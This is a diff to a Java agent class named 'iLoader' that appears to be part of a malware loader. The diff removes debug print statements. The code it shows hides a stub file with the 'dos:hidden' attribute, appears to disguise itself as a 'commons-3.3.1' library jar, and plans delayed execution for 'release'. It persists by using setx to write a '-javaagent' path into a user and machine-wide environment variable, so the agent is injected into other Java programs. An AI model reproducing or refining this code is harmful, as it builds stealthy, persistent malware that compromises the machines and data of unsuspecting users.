@@ -130,12 +130,10 @@ public class iLoader
 
     public static void premain(String agentArgs, Instrumentation inst) throws Exception, InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
-        System.out.println("iLoader");
         //TimeUnit.MILLISECONDS.sleep((rngenerator(2,5))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
         coreOp();
-        System.out.println("finished core op");
 
         /* 
         Thread thread = new Thread(new Runnable() {
@@ -165,7 +163,6 @@ public class iLoader
         {
             Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
         } 
-        System.out.println(System.getProperty("sun.java.command"));
         if (!System.getProperty("sun.java.command").contains("commons-3.3.1"))
         {
             passThroughJar(stubPath, (new String[]{}));
@@ -265,6 +262,7 @@ public class iLoader
             try
             {
                 //lazy but idgaf, this is the simplest way to do it. I may switch to registry if I have time
+                //hey it's future me... I didn't
                 Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath)});
                 Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath),"/m"});
             }
